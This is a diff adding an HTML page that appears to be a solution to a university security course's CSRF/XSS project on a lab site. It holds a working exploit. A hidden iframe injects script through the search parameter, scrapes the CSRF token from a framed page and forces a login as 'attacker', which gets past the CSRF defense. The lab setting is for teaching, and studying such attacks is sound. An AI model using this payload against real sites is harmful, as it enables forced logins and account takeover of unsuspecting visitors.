@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js"></script>
+	<script>		
+		$(function(){
+			$('#iframe').hide();
+		});
+	</script>
+</head>
+
+<body>
+	<iframe src="http://eecs388.org/project2/search?q=<iframe id="iframe" src="http://eecs388.org/project2/?csrfdefense=1&xssdefense=0"></iframe><script>$(function(){setTimeout(function(){$.post("http://eecs388.org/project2/login?csrfdefense=1&xssdefense=0",{username:"attacker",password:"l33th4x",csrf_token:$('#iframe').contents().find('input[name="csrf_token"]').val()},function(e){console.log('successful');});}, 1000);});</script>&csrfdefense=1&xssdefense=0">
+</body>
+</html>
+
